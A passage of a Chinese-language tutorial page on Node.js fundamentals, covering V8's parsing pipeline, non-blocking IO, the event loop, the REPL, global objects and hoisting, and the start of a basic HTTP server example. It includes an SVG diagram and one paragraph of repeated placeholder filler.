id="SvgjsG1070"><path id="SvgjsPath1071" d="M681.3333333333334 116L730.6666666666667 116L730.6666666666667 116L777.4 116" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1072)"/></g><g id="SvgjsG1074"><path id="SvgjsPath1075" d="M882 116L930.8333333333335 116L930.8333333333335 116L980.6666666666667 116" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1076)"/></g><g id="SvgjsG1078"><path id="SvgjsPath1079" d="M681.3333333333334 366L730.6666666666667 366L730.6666666666667 366L777.4 366" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1080)"/></g><g id="SvgjsG1082"><path id="SvgjsPath1083" d="M642 152L642 241L642 241L642 327.4" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1084)"/></g><g id="SvgjsG1086"><path id="SvgjsPath1087" d="M831 330L831 241L831 241L831 154.6" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1088)"/></g><g id="SvgjsG1090"><path id="SvgjsPath1091" d="M882 366L932.3333333333335 366L932.3333333333335 366L983.6666666666667 366" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1092)"/></g><g id="SvgjsG1094" transform="translate(952,96)"><path id="SvgjsPath1095" d="M 0 0L 120 0L 120 40L 0 40Z" stroke="none" fill="none"/><g id="SvgjsG1096"><text id="SvgjsText1097" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="120px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="9.375" transform="rotate(0)"><tspan id="SvgjsTspan1098" dy="16" x="60"><tspan id="SvgjsTspan1099" style="text-decoration:;">&#x8FD0;&#x884C;&#x7ED3;&#x679C;</tspan></tspan></text></g></g><g id="SvgjsG1100" transform="translate(952,346)"><path id="SvgjsPath1101" d="M 0 0L 120 0L 120 40L 0 40Z" stroke="none" fill="none"/><g id="SvgjsG1102"><text id="SvgjsText1103" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="120px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="9.375" transform="rotate(0)"><tspan id="SvgjsTspan1104" dy="16" x="60"><tspan id="SvgjsTspan1105" style="text-decoration:;">&#x8FD0;&#x884C;&#x7ED3;&#x679C;</tspan></tspan></text></g></g><g id="SvgjsG1106"><path id="SvgjsPath1107" d="M791 152L791 241L673 241L673 327.4" stroke="#323232" stroke-width="2" fill="none" marker-end="url(#SvgjsMarker1108)"/></g><g id="SvgjsG1110" transform="translate(844,225.25)"><path id="SvgjsPath1111" d="M 0 0L 162 0L 162 41L 0 41Z" stroke="none" fill="none"/><g id="SvgjsG1112"><text id="SvgjsText1113" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="162px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="1.375" transform="rotate(0)"><tspan id="SvgjsTspan1114" dy="16" x="81"><tspan id="SvgjsTspan1115" style="text-decoration:;">Deoptimization =&gt;</tspan></tspan><tspan id="SvgjsTspan1116" dy="16" x="81"><tspan id="SvgjsTspan1117" style="text-decoration:;">&#x51FD;&#x6570;&#x4F20;&#x5165;&#x4E0D;&#x540C;&#x7C7B;&#x578B;&#x53C2;&#x6570;</tspan></tspan></text></g></g><g id="SvgjsG1118" transform="translate(592,25)"><path id="SvgjsPath1119" d="M 0 0L 120 0L 120 40L 0 40Z" stroke="none" fill="none"/><g id="SvgjsG1120"><text id="SvgjsText1121" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="120px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="0.875" transform="rotate(0)"><tspan id="SvgjsTspan1122" dy="16" x="60"><tspan id="SvgjsTspan1123" style="text-decoration:;">an interpreter</tspan></tspan><tspan id="SvgjsTspan1124" dy="16" x="60"><tspan id="SvgjsTspan1125" style="text-decoration:;">&#x4E0D;&#x786E;&#x5B9A;&#x8F6C;&#x6362;&#x7684;&#x673A;&#x5668;&#x7801;</tspan></tspan></text></g></g><g id="SvgjsG1126" transform="translate(741.5,35)"><path id="SvgjsPath1127" d="M 0 0L 183.5 0L 183.5 25L 0 25Z" stroke="none" fill="none"/><g id="SvgjsG1128"><text id="SvgjsText1129" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="184px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="-6.625" transform="rotate(0)"><tspan id="SvgjsTspan1130" dy="16" x="92"><tspan id="SvgjsTspan1131" style="text-decoration:;">&#x8DE8;&#x5E73;&#x53F0;&#xFF1B;&#x4E0D;&#x540C;&#x73AF;&#x5883;&#x4E0D;&#x540C; cpu &#x67B6;</tspan></tspan><tspan id="SvgjsTspan1132" dy="16" x="92"><tspan id="SvgjsTspan1133" style="text-decoration:;">&#x6784;&#xFF0C;&#x6267;&#x884C;&#x7684;&#x673A;&#x5668;&#x6307;&#x4EE4;&#x4E5F;&#x4E0D;&#x4E00;&#x6837;</tspan></tspan></text></g></g><g id="SvgjsG1134" transform="translate(857,120.5)"><path id="SvgjsPath1135" d="M 0 0L 179 0L 179 40L 0 40Z" stroke="none" fill="none"/><g id="SvgjsG1136"><text id="SvgjsText1137" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="179px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="9.375" transform="rotate(0)"><tspan id="SvgjsTspan1138" dy="16" x="89.5"><tspan id="SvgjsTspan1139" style="text-decoration:;">&#x8F6C;&#x6C47;&#x7F16;&#x518D;&#x8F6C;&#x673A;&#x5668;&#x6307;&#x4EE4;</tspan></tspan></text></g></g><g id="SvgjsG1140" transform="translate(513,213)"><path id="SvgjsPath1141" d="M 0 0L 120 0L 120 40L 0 40Z" stroke="none" fill="none"/><g id="SvgjsG1142"><text id="SvgjsText1143" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="120px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="-7.125" transform="rotate(0)"><tspan id="SvgjsTspan1144" dy="16" x="60"><tspan id="SvgjsTspan1145" style="text-decoration:;">&#x9010;&#x4E2A;&#x5BF9;&#x51FD;&#x6570;&#x7F16;&#x8BD1;&#xFF0C;&#x6536;</tspan></tspan><tspan id="SvgjsTspan1146" dy="16" x="60"><tspan id="SvgjsTspan1147" style="text-decoration:;">&#x96C6;&#x51FD;&#x6570;&#x6267;&#x884C;&#x9891;&#x7387;&#x4FE1;&#x606F;</tspan></tspan><tspan id="SvgjsTspan1148" dy="16" x="60"><tspan id="SvgjsTspan1149" style="text-decoration:;">&#x5E76;&#x7528;&#x4E8E;&#x63A8;&#x6D4B;&#x6027;&#x4F18;&#x5316;</tspan></tspan></text></g></g><g id="SvgjsG1150" transform="translate(214,27.5)"><path id="SvgjsPath1151" d="M 0 0L 120 0L 120 40L 0 40Z" stroke="none" fill="none"/><g id="SvgjsG1152"><text id="SvgjsText1153" font-family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" text-anchor="middle" font-size="13px" width="120px" fill="#323232" font-weight="400" align="middle" lineheight="125%" anchor="middle" family="&#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;" size="13px" weight="400" font-style="" opacity="1" y="9.375" transform="rotate(0)"><tspan id="SvgjsTspan1154" dy="16" x="60"><tspan id="SvgjsTspan1155" style="text-decoration:;">&#x8BCD;&#x6CD5;&#x5206;&#x6790;&#x3001;&#x8BED;&#x6CD5;&#x5206;&#x6790;</tspan></tspan></text></g></g></svg>
</div>
<p><a href="https://v8.dev/blog/scanner">&#x5B98;&#x65B9; V8 &#x5F15;&#x64CE;&#x539F;&#x7406;</a>&#x4E2D;&#x662F;&#x901A;&#x8FC7; Blink &#x5C06;&#x6E90;&#x7801;&#x4EA4;&#x7ED9; V8 engine&#xFF0C;&#x4EE5; Stream &#x83B7;&#x53D6;&#x5230;&#x6E90;&#x7801;&#x5E76;&#x4E14;&#x8FDB;&#x884C;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#xFF1B;Scanner &#x8FDB;&#x884C;&#x8BCD;&#x6CD5;&#x5206;&#x6790;&#x751F;&#x6210; tokens&#xFF0C;&#x518D;&#x7ECF;&#x8FC7; Parser &#x548C; PreParser &#x8F6C;&#x6362;&#x6210; AST&#x3002;&#x4E0D;&#x540C;&#x4E8E;&#x524D;&#x8005;&#x7684;&#x76F4;&#x63A5;&#x89E3;&#x6790;&#x8F6C;&#x6362;&#xFF0C;&#x540E;&#x8005;&#x662F;&#x9884;&#x89E3;&#x6790;&#xFF0C;&#x56E0;&#x4E3A;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684; JS &#x4EE3;&#x7801;&#x5728;&#x4E00;&#x5F00;&#x59CB;&#x65F6;&#x5C31;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x901A;&#x8FC7;&#x5EF6;&#x8FDF;&#x89E3;&#x6790;&#x5C06;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x9884;&#x89E3;&#x6790;&#xFF08;&#x51FD;&#x6570;&#x7684;&#x5168;&#x91CF;&#x89E3;&#x6790;&#x662F;&#x5728;&#x51FD;&#x6570;&#x88AB;&#x8C03;&#x7528;&#x65F6;&#x624D;&#x8FDB;&#x884C; =&gt; &#x51FD;&#x6570; outer &#x5185;&#x90E8;&#x5B9A;&#x4E49;&#x51FD;&#x6570; inner&#xFF0C;&#x90A3; inner &#x51FD;&#x6570;&#x5C31;&#x4F1A;&#x8FDB;&#x884C;&#x9884;&#x89E3;&#x6790;&#xFF09;&#x3002;&#x751F;&#x6210;&#x7684;&#x62BD;&#x8C61;&#x8BED;&#x6CD5;&#x6811;&#x4F1A;&#x88AB; Ignition &#x8F6C;&#x6210;&#x5B57;&#x8282;&#x7801;&#x540E;&#x6267;&#x884C;&#x3002;</p>
<h3 id="%E9%AB%98%E5%85%89%E6%97%B6%E5%88%BB">&#x9AD8;&#x5149;&#x65F6;&#x523B;</h3>
<p>NodeJS &#x6709;&#x4E24;&#x4E2A;&#x9AD8;&#x5149;&#x7279;&#x6027;&#xFF0C;&#x975E;&#x963B;&#x585E; IO &#x4E0E;&#x4E8B;&#x4EF6;&#x9A71;&#x52A8;&#x3002;</p>
<ul>
<li>&#x975E;&#x963B;&#x585E; IO &#x6A21;&#x578B;</li>
</ul>
<p>&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;</p>
<blockquote>
<p>IO &#x5373;&#x8BA1;&#x7B97;&#x673A;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#xFF0C;&#x5E38;&#x89C1;&#x6709;&#x5916;&#x63A5;&#x786C;&#x4EF6;&#x3001;&#x78C1;&#x76D8;&#x8BFB;&#x5199;&#x3001;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x751A;&#x81F3;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x3002;</p>
</blockquote>
<p>&#x963B;&#x585E; IO &#x5C31;&#x662F;&#x8FDB;&#x884C; IO &#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x8FDB;&#x7A0B;&#x5904;&#x4E8E;&#x4F11;&#x7720;&#x72B6;&#x6001;&#xFF0C;&#x7B49;&#x5F85; IO &#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x518D;&#x8FDB;&#x884C;&#x4E0B;&#x4E00;&#x6B21;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>
<p>&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x975E;&#x963B;&#x585E; IO &#x5C31;&#x662F;&#x5728;&#x7A0B;&#x5E8F;&#x9047;&#x89C1; IO &#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x4E3B;&#x7A0B;&#x5E8F;&#x4E0D;&#x5FC5;&#x7B49;&#x5F85;&#x5E95;&#x5C42; IO &#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x6B65;&#x6307;&#x4EE4;&#xFF0C;IO &#x64CD;&#x4F5C;&#x5B8C;&#x6BD5;&#x518D;&#x901A;&#x77E5;&#x4E3B;&#x8FDB;&#x7A0B;&#x5373;&#x53EF;&#x3002;&#x901A;&#x77E5;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x5728; IO &#x64CD;&#x4F5C;&#x540E;&#xFF0C;&#x89E6;&#x53D1;&#x4E00;&#x4E2A;&#x4E8B;&#x4EF6;&#x51FD;&#x6570;&#x4F7F;&#x4E3B;&#x8FDB;&#x7A0B;&#x5F97;&#x5230;&#x54CD;&#x5E94;&#x3002;</p>
<ul>
<li>&#x4E8B;&#x4EF6;&#x9A71;&#x52A8;</li>
</ul>
<p>&#x533A;&#x522B;&#x4E8E; Nginx &#x591A;&#x8FDB;&#x7A0B;&#x5355;&#x7EBF;&#x7A0B;&#xFF0C;NodeJS &#x901A;&#x8FC7;&#x4E8B;&#x4EF6;&#x9A71;&#x52A8;&#x7684;&#x65B9;&#x5F0F;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x65F6;&#x65E0;&#x9700;&#x4E3A;&#x6BCF;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x521B;&#x5EFA;&#x989D;&#x5916;&#x7684;&#x7EBF;&#x7A0B;&#x3002;&#x6BCF;&#x4E00;&#x4E2A; IO &#x64CD;&#x4F5C;&#x90FD;&#x4F1A;&#x88AB;&#x6DFB;&#x52A0;&#x5230;&#x4E8B;&#x4EF6;&#x961F;&#x5217;&#x4E2D;&#xFF0C;&#x7EBF;&#x7A0B;&#x5FAA;&#x73AF;&#x5730;&#x5904;&#x7406;&#x961F;&#x5217;&#x4E0A;&#x7684;&#x5DE5;&#x4F5C;&#x4EFB;&#x52A1;&#xFF0C;&#x5F53;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x9047;&#x5230;&#x963B;&#x585E;&#xFF0C;&#x7EBF;&#x7A0B;&#x4E0D;&#x4F1A;&#x505C;&#x4E0B;&#x6765;&#x7B49;&#x5F85;&#x7ED3;&#x679C;&#xFF0C;&#x800C;&#x662F;&#x7559;&#x4E0B;&#x4E00;&#x4E2A;&#x5904;&#x7406;&#x7ED3;&#x679C;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#xFF0C;&#x8F6C;&#x800C;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x961F;&#x5217;&#x4E2D;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;&#x3002;&#x8FD9;&#x4E2A;&#x4F20;&#x9012;&#x5230;&#x961F;&#x5217;&#x4E2D;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x5728;&#x963B;&#x585E;&#x4EFB;&#x52A1;&#x8FD0;&#x884C;&#x7ED3;&#x675F;&#x540E;&#x624D;&#x88AB;&#x7EBF;&#x7A0B;&#x8C03;&#x7528;&#x3002;</p>
<h3 id="repl-read-eval-print-loop">REPL Read-Eval-Print Loop</h3>
<p>REPL &#x5373;&#x8BFB;&#x53D6;-&#x6C42;&#x503C;-&#x8F93;&#x51FA;&#x5FAA;&#x73AF;&#xFF0C;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7406;&#x89E3;&#x4E3A;&#x4E00;&#x4E2A;&#x4EA4;&#x4E92;&#x5F0F;&#x7F16;&#x7A0B;&#x73AF;&#x5883;&#x3002;</p>
<pre><code class="language-shell">$ node
Welcome to Node.js v14.17.1.
Type &quot;.help&quot; for more information.
$ process
process { version: &apos;v14.17.1&apos;, versions: { node: &apos;14.17.1&apos;, v8: &apos;8.4.371.23-...
</code></pre>
<pre><code class="language-javascript">node index.js zszszs age=22 // &#x7ED9; node &#x4F20;&#x53C2;&#x4F7F;&#x7528; process &#x5185;&#x7F6E;&#x5BF9;&#x8C61;&#x7684; argv(argument vector) &#x63A5;&#x6536;
console.trace(); // &#x6253;&#x5370;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x6808;
</code></pre>
<h3 id="io-%E5%AF%86%E9%9B%86%E4%B8%8E-web-%E5%BC%80%E5%8F%91">IO &#x5BC6;&#x96C6;&#x4E0E; WEB &#x5F00;&#x53D1;</h3>
<ul>
<li>IO &#x5BC6;&#x96C6;&#x4E0E; CPU &#x5BC6;&#x96C6;</li>
</ul>
<p>CPU &#x5BC6;&#x96C6; =&gt; &#x7A0B;&#x5E8F;&#x5927;&#x90E8;&#x5206;&#x65F6;&#x95F4;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x3001;&#x6587;&#x4EF6;&#x538B;&#x7F29;&#x89E3;&#x538B;&#x4E0E;&#x6570;&#x636E;&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;</p>
<p>IO &#x5BC6;&#x96C6; =&gt; &#x7A0B;&#x5E8F;&#x5927;&#x90E8;&#x5206;&#x65F6;&#x95F4;&#x7528;&#x6765;&#x505A;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x4EE5;&#x53CA;&#x7F51;&#x7EDC;&#x8BFB;&#x53D6;&#x7684;&#x64CD;&#x4F5C;</p>
<ul>
<li>WEB &#x5F00;&#x53D1;&#x7684; IO &#x5BC6;&#x96C6;</li>
</ul>
<p>&#x5F53;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x7684;&#x8BF7;&#x6C42;&#x5230;&#x8FBE;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x9664;&#x4E86;&#x4F7F;&#x7528; cpu &#x8FDB;&#x884C;&#x8BA1;&#x7B97; uri &#x8DEF;&#x5F84;&#x7684;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x90FD;&#x662F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#xFF0C;&#x7531;&#x6B64;&#x53EF;&#x89C1; http &#x8BF7;&#x6C42;&#x5927;&#x90E8;&#x5206;&#x8FD8;&#x662F; IO &#x64CD;&#x4F5C;&#x3002;&#x6B64;&#x5916;&#x5728;&#x9875;&#x9762;&#x6E32;&#x67D3;&#x65F6;&#xFF0C;&#x9664;&#x5F00;&#x4F7F;&#x7528; cpu &#x8BA1;&#x7B97;&#xFF0C;&#x5176;&#x4ED6;&#x6D89;&#x53CA;&#x8BFB;&#x53D6;&#x6A21;&#x677F;&#x6587;&#x4EF6;&#x6216;&#x6839;&#x636E;&#x6570;&#x636E;&#x751F;&#x6210; Html &#x90FD;&#x7B97;&#x505A; IO &#x64CD;&#x4F5C;&#x3002;&#x6240;&#x4EE5;&#x8BF4; WEB &#x5F00;&#x53D1;&#x662F;&#x5178;&#x578B;&#x7684; IO &#x5BC6;&#x96C6;&#x7684;&#x573A;&#x666F;&#x3002;</p>
<ul>
<li>&#x8FDB;&#x7A0B;&#x4E0E;&#x7EBF;&#x7A0B;</li>
</ul>
<p>&#x8FDB;&#x7A0B; Process &#x901A;&#x4FD7;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x6B63;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x8FD0;&#x884C;&#x7684;&#x7A0B;&#x5E8F;&#xFF0C;&#x591A;&#x8FDB;&#x7A0B;&#x662F;&#x901A;&#x8FC7; cpu &#x8C03;&#x5EA6;&#x7B97;&#x6CD5;&#x5728;&#x7EB3;&#x79D2;&#x5355;&#x4F4D;&#x5207;&#x6362;&#x6267;&#x884C;&#x591A;&#x4E2A;&#x8FDB;&#x7A0B;&#x3002;&#x7EBF;&#x7A0B;&#x662F;&#x8FDB;&#x7A0B;&#x5185;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x72EC;&#x7ACB;&#x7684;&#x53EF;&#x8C03;&#x5EA6;&#x7684;&#x6267;&#x884C;&#x5355;&#x5143;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8FDB;&#x7A0B;&#x4E2D;&#x5355;&#x4E00;&#x987A;&#x5E8F;&#x7684;&#x63A7;&#x5236;&#x6D41;&#x3002;&#x591A;&#x4EFB;&#x52A1;&#x5C31;&#x662F;&#x8BF4;&#x5728;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x53EF;&#x4EE5;&#x5E76;&#x53D1;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x800C;&#x6BCF;&#x6761;&#x7EBF;&#x7A0B;&#x5E76;&#x884C;&#x6267;&#x884C;&#x4E0D;&#x540C;&#x7684;&#x4EFB;&#x52A1;&#x3002;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5F00;&#x542F;&#x4E00;&#x9879;&#x4EFB;&#x52A1;&#xFF0C;&#x5C31;&#x662F;&#x6253;&#x5F00;&#x4E86;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E; Downie4 &#x5F00;&#x59CB;&#x4E86;&#x4E00;&#x4E2A;&#x4E0B;&#x8F7D;&#x4EFB;&#x52A1;&#x3002;</p>
<h3 id="globals-%E5%85%A8%E5%B1%80%E5%AF%B9%E8%B1%A1"><a href="https://nodejs.org/api/globals.html">Globals &#x5168;&#x5C40;&#x5BF9;&#x8C61;</a></h3>
<p>&#x5168;&#x5C40;&#x5BF9;&#x8C61; =&gt; &#x5728;&#x7A0B;&#x5E8F;&#x7684;&#x4EFB;&#x4F55;&#x4F4D;&#x7F6E;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x7684;&#x5BF9;&#x8C61;</p>
<p>&#x5728; JS &#x6E90;&#x4EE3;&#x7801;&#x901A;&#x8FC7; Parse &#x8F6C;&#x6362;&#x4E3A; AST &#x7684;&#x9636;&#x6BB5;&#xFF0C;&#x4F1A;&#x521B;&#x5EFA;&#x5168;&#x5C40;&#x5BF9;&#x8C61; GlobalObject&#xFF0C;&#x5E76;&#x653E;&#x5165; window &#x5C5E;&#x6027;&#xFF08;&#x5373; this &#x6307;&#x5411;&#x5F53;&#x524D; GlobalObject&#xFF09;&#x3001;setTimeout...&#x3002;&#x5B58;&#x5728;&#x90E8;&#x5206;&#x7279;&#x6B8A;&#x7684;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x8FD9;&#x4E9B;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x6A21;&#x5757;&#x4E2D;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x90FD;&#x6709;&#xFF0C;&#x6240;&#x4EE5;&#x770B;&#x8D77;&#x6765;&#x597D;&#x50CF;&#x662F;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x4F46;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x4EA4;&#x4E92;&#x4E2D;&#x4E0D;&#x53EF;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x3002;</p>
<pre><code class="language-javascript">// &#x5E38;&#x89C1;&#x7684;&#x5168;&#x5C40;&#x53D8;&#x91CF;
process // &#x63D0;&#x4F9B;Node&#x8FDB;&#x7A0B;&#x76F8;&#x5173;&#x4FE1;&#x606F;
console // &#x63A7;&#x5236;&#x53F0;
// &#x5B9A;&#x65F6;&#x5668;&#x5168;&#x5C40;&#x51FD;&#x6570;
setTimeout(() =&gt; {},time)
setInterval(() =&gt; {},time)
setImmediate(() =&gt; {})
process.nextTick(() =&gt; {})
// &#x5168;&#x5C40;&#x5BF9;&#x8C61;
global // global. &#x6309;&#x4E24;&#x4E0B; Tab
</code></pre>
<pre><code class="language-javascript">// &#x7279;&#x6B8A;&#x7684;&#x5168;&#x5C40;&#x53D8;&#x91CF;
// &#x9700;&#x8981;&#x8FDB;&#x5165;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x6587;&#x4EF6;&#x5939;&#x518D; node index.js
__dirname // &#x6253;&#x5370;&#x5F53;&#x524D;&#x6587;&#x4EF6;&#x5939;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
__filename // &#x6253;&#x5370;&#x5F53;&#x524D;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
exports&#x3001;module&#x3001;require() // &#x6A21;&#x5757;&#x5316;&#x76F8;&#x5173;
</code></pre>
<p>V8 &#x5728;&#x521B;&#x5EFA; GO &#x540E;&#xFF0C;&#x4E3A;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x8FD8;&#x9700;&#x8981; ECStack Execution Context Stack &#x6267;&#x884C;&#x4E0A;&#x4E0B;&#x6587;&#x6808;&#x4F5C;&#x4E3A;&#x5BB9;&#x5668;&#x53BB;&#x63A5;&#x6536; GEC Global Execution Context &#x5168;&#x5C40;&#x6267;&#x884C;&#x4E0A;&#x4E0B;&#x6587;&#x3002;</p>
<p>VO Variable Object &#x53D8;&#x91CF;&#x5BF9;&#x8C61;&#x5728;&#x7F16;&#x8BD1;&#x65F6;&#xFF0C;&#x5176;&#x5185;&#x6BCF;&#x4E00;&#x9879;&#x53EA;&#x662F;&#x5BF9;&#x5E94; GO &#x7684;&#x521D;&#x59CB;&#x672A;&#x8D4B;&#x503C;&#x5C5E;&#x6027;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x6267;&#x884C;&#x671F;&#x95F4;&#x624D;&#x4F1A;&#x5BF9;&#x76F8;&#x5E94;&#x5C5E;&#x6027;&#x66F4;&#x6539;&#x3002;</p>
<pre><code class="language-javascript">/* --- &#x4F2A;&#x4EE3;&#x7801; --- */
/*
GO =&gt;
var globalObject = {
  String:&quot;Class&quot;, Date:&quot;Class&quot;,setTimeout:&quot;Func&quot;,window:globalObject,name:undefined,age:undefined
}
*/
// &#x89E3;&#x91CA;&#x53D8;&#x91CF;&#x63D0;&#x5347;&#x4E3A;&#x4EC0;&#x4E48;&#x51FA;&#x73B0; undefined
var name = &quot;zs&quot;
console.log(age) // &#x7F16;&#x8BD1;&#x5B8C;&#x6210;&#x4F46;&#x672A;&#x6267;&#x884C; =&gt; GO &#x4E2D;&#x8FD8;&#x662F; undefined
var age = 22
</code></pre>
<h3 id="node-%E5%88%9B%E5%BB%BA-web-%E6%9C%8D%E5%8A%A1%E5%99%A8">Node &#x521B;&#x5EFA; Web &#x670D;&#x52A1;&#x5668;</h3>
<p>&#x5B98;&#x65B9;&#x6587;&#x6863; =&gt; <a href="http://nodejs.cn/api/http.html#class-httpserver">&#x4E8B;&#x4EF6;</a>&#x3001;<a href="http://nodejs.cn/api/http.html#httpcreateserveroptions-requestlistener">Web Server</a></p>
<ul>
<li>&#x83B7;&#x53D6; ip &#x7684; server</li>
</ul>
<pre><code class="language-javascript">// &#x521B;&#x5EFA; web &#x670D;&#x52A1;&#x5668;
const http = require(&apos;http&apos;)
const port = 8089
const server = http.createServer((req,res)=&gt;{
    // setHeader &#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x5355;&#x4E2A;&#x6807;&#x5934; =&gt; res.setHeader(&apos;Content-Type&apos;,&apos;text/html; charset=utf-8&apos;) | &#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x9009;&#x62E9; res.writeHead
